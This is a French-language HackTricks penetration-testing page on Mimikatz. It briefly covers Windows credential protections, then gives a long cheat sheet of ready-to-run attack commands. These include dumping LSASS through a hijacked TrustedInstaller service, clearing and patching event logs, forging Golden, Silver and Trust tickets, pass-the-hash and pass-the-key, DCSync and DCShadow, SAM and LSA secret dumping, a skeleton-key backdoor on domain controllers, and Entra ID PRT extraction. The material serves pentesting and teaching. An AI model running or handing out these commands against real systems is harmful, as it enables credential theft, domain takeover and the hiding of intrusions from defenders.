# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Cette page est basée sur une page de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consultez l’original pour en savoir plus !<sup>[[3]](#references)</sup>

## LM et texte clair en mémoire

À partir de Windows 8.1 et Windows Server 2012 R2, des mesures importantes ont été mises en œuvre pour empêcher le vol d’identifiants :

- **Les hashes LM et les mots de passe en texte brut** ne sont plus stockés en mémoire afin de renforcer la sécurité. Un paramètre spécifique du registre, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, doit être configuré avec une valeur DWORD de `0` pour désactiver l’authentification Digest et garantir que les mots de passe en « texte clair » ne sont pas mis en cache dans LSASS.

- **La protection LSA** est introduite pour protéger le processus Local Security Authority (LSA) contre la lecture non autorisée de la mémoire et l’injection de code. Pour ce faire, LSASS est marqué comme processus protégé. L’activation de la protection LSA implique :
  1. Modifier le registre à l’emplacement _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ en définissant `RunAsPPL` sur `dword:00000001`.
  2. Mettre en œuvre un objet de stratégie de groupe (GPO) qui applique cette modification du registre sur les appareils gérés.

Malgré ces protections, des outils comme Mimikatz peuvent contourner la protection LSA à l’aide de pilotes spécifiques, bien que ces actions soient susceptibles d’être consignées dans les journaux d’événements.

Sur les postes de travail modernes, c’est encore plus important, car **Credential Guard est activé par défaut sur de nombreux systèmes Windows 11 22H2+ et Windows Server 2025 joints à un domaine et non contrôleurs de domaine**, tandis que **LSASS en tant que PPL est activé par défaut sur les nouvelles installations de Windows 11 22H2+**. En pratique, cela signifie que `sekurlsa::logonpasswords` fournit souvent moins d’informations que ne le laissaient prévoir les anciennes techniques, et que les opérateurs se tournent de plus en plus vers les **minidumps hors ligne**, **l’extraction de clés Kerberos (`sekurlsa::ekeys`)** ou les **modules axés sur CloudAP/PRT**. Pour en savoir plus sur les protections, consultez [Windows credentials protections](credentials-protections.md).

### Contrecarrer la suppression de SeDebugPrivilege

Les administrateurs disposent généralement de SeDebugPrivilege, qui leur permet de déboguer des programmes. Ce privilège peut être restreint afin d’empêcher les dumps mémoire non autorisés, une technique couramment utilisée par les attaquants pour extraire des identifiants de la mémoire. Toutefois, même si ce privilège est supprimé, le compte TrustedInstaller peut toujours effectuer des dumps mémoire à l’aide d’une configuration de service personnalisée :

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Cela permet de vider la mémoire de `lsass.exe` dans un fichier, qui peut ensuite être analysé sur un autre système afin d'en extraire des identifiants :

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Options de Mimikatz

La manipulation des journaux d’événements avec Mimikatz repose sur deux actions principales : effacer les journaux d’événements et patcher le service Event pour empêcher l’enregistrement de nouveaux événements. Voici les commandes permettant d’effectuer ces actions :

#### Effacer les journaux d’événements

Mimikatz propose bien `event::clear`. Cette commande appelle l’API Windows d’effacement des journaux d’événements pour le journal classique sélectionné. Le journal par défaut est `Security` ; `/log:` permet d’en sélectionner un autre, et l’appelant doit disposer des droits nécessaires pour l’effacer. Cette commande est différente de `event::drop`, qui tente d’empêcher l’écriture de nouveaux enregistrements.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Fonctionnalité expérimentale : patcher le service Event

- **Commande** : `event::drop`
- Cette commande expérimentale est conçue pour modifier le comportement du service de journalisation des événements, l’empêchant ainsi d’enregistrer de nouveaux événements.
- Exemple : `mimikatz "privilege::debug" "event::drop" exit`

- La commande `privilege::debug` permet à Mimikatz de disposer des privilèges nécessaires pour modifier les services système.
- La commande `event::drop` patche ensuite le service de journalisation des événements.

### Attaques par tickets Kerberos

Utilisez les commandes ci-dessous comme aide-mémoire syntaxique. Les pages dédiées aux [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) et [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contiennent les informations à jour sur les subtilités liées à AES/PAC/opsec.

### Création d’un Golden Ticket

Un Golden Ticket permet l’usurpation d’identité avec un accès à l’ensemble du domaine. Commande et paramètres clés :

- Commande : `kerberos::golden`
- Paramètres :
  - `/domain` : Le nom du domaine.
  - `/sid` : L’identifiant de sécurité (SID) du domaine.
  - `/user` : Le nom d’utilisateur à usurper.
  - `/krbtgt` : Le hash NTLM du compte de service KDC du domaine.
  - `/ptt` : Injecte directement le ticket en mémoire.
  - `/ticket` : Enregistre le ticket pour une utilisation ultérieure.

Exemple :

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Création d’un Silver Ticket

Les Silver Tickets accordent l’accès à des services spécifiques. Commande et paramètres clés :

- Commande : similaire au Golden Ticket, mais cible des services spécifiques.
- Paramètres :
  - `/service` : le service ciblé (p. ex., cifs, http).
  - Autres paramètres similaires à ceux du Golden Ticket.

Exemple :

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Création de Trust Ticket

Les Trust Tickets permettent d’accéder à des ressources entre domaines en exploitant les relations d’approbation. Commande et paramètres clés :

- Commande : similaire à un Golden Ticket, mais pour les relations d’approbation.
- Paramètres :
  - `/target` : le FQDN du domaine cible.
  - `/rc4` : le hash NTLM du compte d’approbation.

Exemple :

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Commandes Kerberos supplémentaires

- **Listing Tickets** :

  - Commande : `kerberos::list`
  - Affiche tous les tickets Kerberos de la session utilisateur actuelle.

- **Pass the Cache** : `kerberos::ptc` lit un fichier MIT/Heimdal `.ccache`, **pas** un fichier `.kirbi`. Indiquez le chemin du fichier comme argument positionnel : `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket** : `kerberos::ptt` lit un fichier `.kirbi` ou un répertoire contenant de tels fichiers. Il prend également un chemin positionnel, et non `/ticket:` : `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Consultez [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) pour le workflow complet.<sup>[[6]](#references)</sup>

- **Purge Tickets** :
  - Commande : `kerberos::purge`
  - Efface tous les tickets Kerberos de la session.
  - Utile avant d’utiliser des commandes de manipulation de tickets pour éviter les conflits.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` est désactivé ou peu fiable, Mimikatz peut injecter des clés Kerberos **AES128/AES256** dans la session d’ouverture de session actuelle, au lieu d’utiliser uniquement un hash NT. Cette approche est généralement mieux adaptée aux domaines modernes que de considérer `sekurlsa::pth` comme étant limité à NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` réutilise le processus actuel au lieu de lancer une nouvelle console, ce qui est pratique lorsque vous voulez exécuter immédiatement des commandes comme `lsadump::dcsync` dans le même contexte.

### Altération d’Active Directory

- **DCShadow** : Faire temporairement agir une machine comme un DC pour manipuler des objets AD. Voir [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync** : Imiter un DC pour demander des données de mot de passe. Voir [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accès aux identifiants

- **LSADUMP::LSA** : Extraire des identifiants de LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync** : Usurper l’identité d’un DC à l’aide des données de mot de passe d’un compte machine.

  - _Aucune commande spécifique pour NetSync n’est fournie dans le contexte d’origine._

- **LSADUMP::SAM** : Accéder à la base de données SAM locale.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets** : Déchiffrer les secrets stockés dans le registre.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM** : Définir un nouveau hash NTLM pour un utilisateur.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust** : Récupérer les informations d’authentification de confiance.
  - `mimikatz "lsadump::trust" exit`

### Identifiants Cloud / Entra ID

Sur des hôtes **Entra ID** ou **hybrid-joined**, `sekurlsa::cloudap` peut exposer des données **Primary Refresh Token (PRT)** mises en cache depuis LSASS. Son `ProofOfPossesionKey.KeyValue` est le blob de clé de session protégé par DPAPI, et non la clé déjà déchiffrée.<sup>[[7]](#references)[[8]](#references)</sup> Pour utiliser `/unprotect`, exécutez `dpapi::cloudapkd` en tant que `SYSTEM` (par exemple, `token::elevate` depuis une session Mimikatz élevée), ou remplissez d’abord le cache de clés de Mimikatz avec `sekurlsa::dpapi`. `privilege::debug` seul ne change pas le contexte de l’appelant DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Copiez le `Context` et le `Derived Key` **correspondants** de la première commande dans la seconde ; Mimikatz génère un nouveau contexte si aucun n’est fourni. Même pour une clé protégée par un TPM, Mimikatz peut dériver une clé de signature en utilisant le TPM de l’appareil d’origine. Il n’est pas nécessaire d’exporter la clé en clair, mais un résultat de dérivation de clé réussi peut signer un cookie de navigateur.<sup>[[7]](#references)</sup>

Une chaîne PRT seule ne suffit pas, car Microsoft Entra exige une preuve de possession de la clé de session associée.<sup>[[9]](#references)</sup> Consultez [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) pour d’autres options de clé principale et [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) pour la chaîne côté cloud.

### Divers

- **MISC::Skeleton** : Injecter une backdoor dans LSASS sur un DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Élévation de privilèges

- **PRIVILEGE::Backup** : Acquérir des droits de sauvegarde.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug** : Obtenir des privilèges de débogage.
  - `mimikatz "privilege::debug" exit`

### Extraction d’identifiants

- **SEKURLSA::LogonPasswords** : Afficher les identifiants des utilisateurs connectés.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets** : Extraire les tickets Kerberos de la mémoire.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipulation des SID et des tokens

- **SID::add/modify** : Modifier le SID et SIDHistory.

  - Ajouter : `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modifier : _Aucune commande spécifique de modification dans le contexte d’origine._

- **TOKEN::Elevate** : Usurper des tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Services Terminal

- **TS::MultiRDP** : Autoriser plusieurs sessions RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions** : Lister les sessions TS/RDP.
  - _Aucune commande spécifique fournie pour TS::Sessions dans le contexte d’origine._

### Vault

- Extraire les mots de passe de Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Les outils de The Hacker – Modules Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB et Entra ID : découvrez votre nouveau flux de cache](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Référence des commandes Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Code source du module event de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Code source du module ccache de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Code source du module Kerberos de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Implémentation DPAPI CloudAP de Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Approfondissement du Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Protection du Primary Refresh Token Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
